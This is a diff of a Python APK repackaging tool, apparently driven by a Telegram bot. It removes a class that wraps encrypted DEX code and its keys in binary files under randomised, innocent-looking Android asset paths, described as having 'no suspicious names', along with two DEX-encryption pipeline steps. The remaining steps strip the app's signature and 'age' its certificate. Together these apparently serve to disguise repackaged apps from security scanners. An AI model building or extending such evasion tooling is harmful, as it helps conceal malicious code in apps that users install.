@@ -10089,91 +10089,6 @@ class DEXRepackager:
         }
 
 
-# ── SAFE KEY GENERATOR — Legitimate Asset Path Generator ─────────────────────
-class SafeKeyGenerator:
-    """
-    Generates legitimate Android-looking asset paths automatically.
-    Every build gets a different path — no pattern — no suspicious names.
-    All folder names, file names and extensions are real Android asset words.
-    """
-
-    FOLDER_POOL = [
-        "drawable", "values", "layout", "fonts", "raw",
-        "media", "cache", "data", "config", "anim",
-        "color", "menu", "xml", "mipmap", "transition",
-    ]
-
-    FILENAME_POOL = [
-        "config", "strings", "theme", "preference",
-        "session", "audio", "roboto", "manifest",
-        "settings", "resources", "metadata",
-        "runtime", "bootstrap", "schema", "index",
-    ]
-
-    EXTENSION_POOL = [".bin", ".dat", ".pak", ".conf", ".raw"]
-
-    # Format marker — identifies our protected app bundle
-    # Looks like a legitimate binary file header
-    BUNDLE_MARKER = bytes([0x41, 0x50, 0x50, 0x42, 0x4E, 0x44, 0x4C, 0x52])
-
-    @classmethod
-    def generate_asset_path(cls) -> str:
-        """
-        Generate a unique legitimate-looking asset path.
-        Example: assets/drawable/config.bin
-        Different combination every build.
-        """
-        folder = random.choice(cls.FOLDER_POOL)
-        name   = random.choice(cls.FILENAME_POOL)
-        ext    = random.choice(cls.EXTENSION_POOL)
-        return f"assets/{folder}/{name}{ext}"
-
-    @classmethod
-    def build_bundle_container(
-        cls,
-        dex_bytes: bytes,
-        primary_key: bytes,
-        secondary_key: bytes
-    ) -> bytes:
-        """
-        Wraps encoded DEX bytes in a legitimate-looking binary container.
-
-        Container layout:
-          [8  bytes] — BUNDLE_MARKER format identifier
-          [32 bytes] — primary encoding key
-          [32 bytes] — secondary encoding key
-          [N  bytes] — encoded DEX content
-          Total header = 72 bytes (matches bootstrap skip offset exactly)
-        """
-        return (
-            cls.BUNDLE_MARKER
-            + primary_key
-            + secondary_key
-            + dex_bytes
-        )
-
-    @classmethod
-    def read_bundle_container(cls, container: bytes):
-        """
-        Reads the bundle container and returns
-        (original_size, primary_key, secondary_key, encoded_dex_bytes).
-        Raises ValueError if marker does not match.
-        """
-        import struct
-        if len(container) < 72:
-            raise ValueError("Container too small — not a valid app bundle")
-        marker = container[:8]
-        if marker != cls.BUNDLE_MARKER:
-            raise ValueError(f"Invalid bundle marker: {marker.hex()}")
-        primary_key   = container[8:40]
-        secondary_key = container[40:72]
-        encoded_dex   = container[72:]
-        return 0, primary_key, secondary_key, encoded_dex
-
-
-
-# ── AXML STRING POOL PATCHER — module-level helper ─────────────────────
-
 def _patch_axml_string_so(data, old_str, new_str):
     """
     Patch a string in binary AXML UTF-8 string pool.
@@ -11219,10 +11134,6 @@ class SOLibraryEncryptionEngine:
             "xor_key_hex":  xor_key.hex(),
         }
 
-# Alias so stray references don't break
-AssetCompiler = SOLibraryCompiler
-DEXEncryptionEngine = SOLibraryEncryptionEngine
-
 # ── APK SIZE OPTIMIZER ────────────────────────────────────────────────────────
 class APKSizeOptimizer:
     """
@@ -11660,7 +11571,7 @@ class ManualControlEngine:
             "protection_score",
         ],
 
-        # Phase 6: Complete — all steps including SO Library DEX protection
+        # Phase 6: Complete — all 22 steps + score
         "phase_6_complete": [
             "preflight_validation",
             "strip_signature",
@@ -11680,8 +11591,6 @@ class ManualControlEngine:
             "resource_normalisation",
             "aes_key_management",
             "rebuild_apk",
-            "asset_compiler",          # Step 17 — SO Library Compiler: DEX → lib/ chunks
-            "dex_encryption",          # Step 18 — SO Library Encryption: second encode layer
             "integrity_manifest",
             "certificate_aging",
             "keystore_generation",
@@ -17243,9 +17152,6 @@ async def button_handler(update, context):
                 "protection_score",
                 "integrity_manifest",
                 "aes_key_management",
-                # DEX protection — must always re-run on rebuilt APK
-                "asset_compiler",
-                "dex_encryption",
             }
             done_steps -= ALWAYS_RERUN_STEPS
             # Also reset workspace so it is rebuilt fresh for this phase
@@ -17294,8 +17200,6 @@ async def button_handler(update, context):
                         rebuilt_apk_override=_apk2,
                         keystore_ctx=_kctx2,
                         completed_ops=_done2))
-
-                result["op"] = op_key  # needed so pre-update loop finds rebuild_apk result
 
                 if op_key == "decode_workspace" and result.get("workspace"):
                     current_workspace = result["workspace"]
@@ -17634,8 +17538,6 @@ async def button_handler(update, context):
                     rebuilt_apk_override=_apk3,
                     keystore_ctx=_kctx3,
                     completed_ops=_done3))
-
-            result["op"] = op_key  # needed so pre-update loop finds rebuild_apk result
 
             # Update state from results
             if op_key == "decode_workspace" and result.get("workspace"):
@@ -19292,8 +19194,6 @@ async def button_handler(update, context):
                     rebuilt_apk_override=_apk4,
                     keystore_ctx=_kctx4,
                     completed_ops=_done4))
-
-            result["op"] = op_key  # needed so pre-update loop finds rebuild_apk result
 
             if op_key == "rebuild_apk" and result.get("rebuilt_apk"):
                 current_apk = result["rebuilt_apk"]
